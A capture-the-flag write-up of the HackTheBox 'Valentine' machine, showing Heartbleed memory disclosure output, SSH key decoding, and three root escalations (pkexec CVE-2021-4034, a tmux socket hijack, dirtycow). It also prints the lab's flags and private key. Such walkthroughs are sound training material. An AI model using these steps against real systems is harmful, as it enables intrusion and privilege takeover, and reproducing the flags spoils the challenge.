---
title: HackTheBox - Valentine
categories: [HackTheBox, HTB-Linux]
date: 2022-08-29
tags: [linux-priv-esc/kernel-exploit]
img_path: /Writeups/HackTheBox/Linux/Valentine/images/
image:
  src: Pasted%20image%2020220829043209.png
  width: 1000   # in pixels
  height: 400   # in pixels
---


# Overview 
This machine begins w/ a web enumeration, discovering `/dev` directory and `omg`, inside `/dev` contains a hex encoded string, decoding it reveals a encrypted SSH private key. Next, `omg` reveals an image of a bleeding heart, hinting us to use an exploit called heartbleed which allows us to obtain the passphrase of the SSH private key. Inturn, allowing us to obtain `hype` user.

For the privilege escalation part, there are 3 ways to do so. The first way is through `CVE-2021-4034`, `polkit` is vulnerable, allowing us to privilege escalate to root. 

The second way is by hijacking a `tmux` session, after enumerating the system w/ `linpeas.sh`, a `tmux` session running as `root` is identified. The socket of the `tmux` session is `RW` accessible to user `hype`, allowing `hype` to privilege escalate to `root`.

The final way is via a kernel exploit called `dirtycow`

---

| Column       | Details                                                     |
| ------------ | ----------------------------------------------------------- |
| Box Name     | Valentine                                                   |
| IP           |    10.10.10.79                                                         |
| Points       |   -                                                          |
| Difficulty   | Easy                                                        |
| Creator      | [mrb3n](https://www.hackthebox.com/home/users/profile/2984) |
| Release Date | 17-Feb-2018                                                            |


# Recon

## TCP/80 (HTTP)
### FFUF - common.txt
```
403      GET       10l       30w      287c http://10.10.10.79/cgi-bin/
403      GET       10l       30w      292c http://10.10.10.79/cgi-bin/.html
200      GET       25l       54w      552c http://10.10.10.79/decode
200      GET       25l       54w      552c http://10.10.10.79/decode.php
301      GET        9l       28w      308c http://10.10.10.79/dev => http://10.10.10.79/dev/
200      GET       27l       54w      554c http://10.10.10.79/encode
200      GET       27l       54w      554c http://10.10.10.79/encode.php
200      GET        1l        2w       38c http://10.10.10.79/index
200      GET        1l        2w       38c http://10.10.10.79/index.php
403      GET       10l       30w      292c http://10.10.10.79/server-status
```
- `encode.php`
- `decode.php`
- `/dev`

### FFUF - directory-list-2.3-medium.txt
```
200      GET        1l        2w       38c http://10.10.10.79/index
200      GET        1l        2w       38c http://10.10.10.79/index.php
301      GET        9l       28w      308c http://10.10.10.79/dev => http://10.10.10.79/dev/
200      GET       27l       54w      554c http://10.10.10.79/encode
200      GET       27l       54w      554c http://10.10.10.79/encode.php
200      GET       25l       54w      552c http://10.10.10.79/decode
200      GET       25l       54w      552c http://10.10.10.79/decode.php
200      GET      620l     3539w   153356c http://10.10.10.79/omg
```
- `omg`


# Initial Foothold

## TCP/80 (HTTP) - Found Private Key
1. Found `hex` string at `http://valentine.htb/dev/hype_key`
	```
	┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
	└─# wget http://10.10.10.79/dev/hype_key
	--2022-08-29 01:20:31--  http://10.10.10.79/dev/hype_key
	Connecting to 10.10.10.79:80... connected.
	HTTP request sent, awaiting response... 200 OK
	Length: 5383 (5.3K)
	Saving to: ‘hype_key’
	
	hype_key                      100%[==============================================>]   5.26K  --.-KB/s    in 0s      
	
	2022-08-29 01:20:31 (40.3 MB/s) - ‘hype_key’ saved [5383/5383]
	
	┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
	└─# head -c 200 hype_key 
	2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20┌
	```
2. Decode it
	```
	┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
	└─# cat hype_key | xxd -r -p | tee id_rsa
	-----BEGIN RSA PRIVATE KEY-----
	Proc-Type: 4,ENCRYPTED
	DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
	
	DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
	5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
	0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
	Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
	OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
	pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
	QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
	p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
	Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
	t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
	XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
	aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
	+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
	AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
	r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
	2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
	e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
	09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
	dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
	cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
	pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
	Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
	suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
	l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
	RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
	-----END RSA PRIVATE KEY-----┌
	```
	- `id_rsa` - Encrypted
3. Crack it w/ john
	```
	# Convert to john format
	┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
	└─# python ssh2john.py id_rsa > id_rsa_john
	
	# Bruteforce
	┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
	└─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_john 
	```
	- Failed
4. At this point me stuck, so I looked for nudges at [HackTheBox Forum](https://forum.hackthebox.com/t/valentine/445/)
	- The picture at `index.php` is a hint
	- Username is obvious
	

## TCP/443 (HTTPS) - Heartbleed
1. Proceed to `http://valentine.htb`
	 ![](Pasted%20image%2020220829030841.png)
	 - Bleeding heart
2. Search exploits named `bleed/heart`
	
	| Exploit Title                                                                      | Path                     |
	| ---------------------------------------------------------------------------------- | ------------------------ |
	| OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple  | multiple/remote/32764.py |
	| OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                | multiple/remote/32791.c  |
	| OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support) | multiple/remote/32998.c  |
	| OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                   | multiple/remote/32745.py |
3. Try `multiple/remote/32764.py`
	1. `32745.py`, did not work for me even though it looks the same
	2. How does it work?
		- This serious flaw (CVE-2014-0160) is a missing bounds check before a `memcpy()` call that uses non-sanitized user input as the length parameter. An attacker can trick OpenSSL into allocating a 64KB buffer, copy more bytes than is necessary into the buffer, send that buffer back, and thus leak the contents of the victim’s memory, 64KB at a time. - [Source](https://owasp.org/www-community/vulnerabilities/Heartbleed_Bug)
		- This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. - [Source](https://heartbleed.com)
	3. Run exploit, extract base64 output
		```
		┌──(root💀kali)-[~/htb/valentine/10.10.10.79/exploit]
		└─# cat bleed.out 
		Trying SSL 3.0...
		Connecting...
		Sending Client Hello...
		Waiting for Server Hello...
		 ... received message: type = 22, ver = 0300, length = 94
		 ... received message: type = 22, ver = 0300, length = 885
		 ... received message: type = 22, ver = 0300, length = 331
		 ... received message: type = 22, ver = 0300, length = 4
		Sending heartbeat request...
		 ... received message: type = 24, ver = 0300, length = 16384
		Received heartbeat response:
		  0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
		  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
		  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
		  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
		  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
		  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
		  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
		  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
		  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
		  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
		  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
		  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
		  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
		  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
		  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
		  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
		  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
		  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
		  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
		  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
		  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
		  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 15  mV0aGVoeXBlCg==.
		  0160: ED 9D 02 7D 42 4F CD 00 9F E3 EF 56 AF A6 08 99  ...}BO.....V....
		  0170: 9F 76 59 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  .vY.............
		  0180: D2 81 18 3A 68 64 AE E9 57 93 E9 CE 14 B0 99 44  ...:hd..W......D
		  0190: 76 11 55 2D 00 15 00 68 00 00 00 00 00 00 00 00  v.U-...h........
		```
		- `$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`
	4. Decode it
		```
		┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
		└─# echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
		heartbleedbelievethehype	
		```
		- This should be the passphrase for the SSH private key


## TCP/22 (SSH)
1. SSH w/ `hype:heartbleedbelievethehype`
	```
	┌──(root💀kali)-[~/htb/valentine/10.10.10.79/loot]
	└─# chmod 600; ssh hype@valentine.htb -i id_rsa
	```
2. User Flag
	```
	e6710a5464769fd5fcd216e076961750
	```
	![](Pasted%20image%2020220829025828.png)

# Privilege Escalation - 1 

## Root - Via CVE-2021-4034
1. Found something interesting w/ `linpeas.sh`
	![](Pasted%20image%2020220829035131.png)
	- `CVE-2021-4034`
1. Try `CVE-2021-4034.py`
	1. How does the exploit work?
		- Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes.
		- Due to an improper implementation of the pkexec tool, an out-of-bounds memory access can be leveraged by a local attacker to escalate their privileges to system root.
	2. [Download Exploit](https://github.com/joeammond/CVE-2021-4034)
	3. Transfer to `valentine.htb` 
	4. Run Exploit
2. Obtained `root` Shell & `root.txt`
	```
	f1bb6d759df1f272914ebbc9ed7765b2
	```
	![](Pasted%20image%2020220829035444.png)


# Privilege Escalation - 2

## Root - Via TMUX hijack

1. Found something interesting w/ `linpeas.sh`
	![](Pasted%20image%2020220829040229.png)
	- `tmux` - process running as root
	- `/.devs/dev_sess`
2. Check file privileges for `/.devs/dev_sess`
	```
	hype@Valentine:/tmp$ ls -la /.devs/dev_sess
	srw-rw---- 1 root hype 0 Aug 27 13:49 /.devs/dev_sess
	hype@Valentine:/tmp$ groups
	hype cdrom dip plugdev sambashare
	```
	- user `hype` belongs to group `hype`
	- group `hype` has `RW` access to `/.devs/dev_sess`
	- This allows us to hijack the session running as `root`
3. Hijack `tmux` to obtain `root`
	```
	hype@Valentine:/tmp$ tmux -S /.devs/dev_sess
	```
	![](vmware_s2COZodOHC.gif)

# Privilege Escalation - 3
## Root - Via Kernel Exploit
1. Identify linux kernel version
	```
	hype@Valentine:/tmp$ uname -a
	Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
	```
	- `3.2.0-23-generic` - vulnerable to dirtycow
2. Try `dirtycow` exploit
	1. [How does the exploit work?](https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/index.html)
	2. [Download Exploit](https://www.exploit-db.com/exploits/40839)
	3. Transfer to `valentine.htb` 
	4. Run Exploit
		```
		hype@Valentine:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
		hype@Valentine:/tmp$ ./dirty password
		hype@Valentine:/tmp$ su firefart
		```
		![](Pasted%20image%2020220829042936.png)



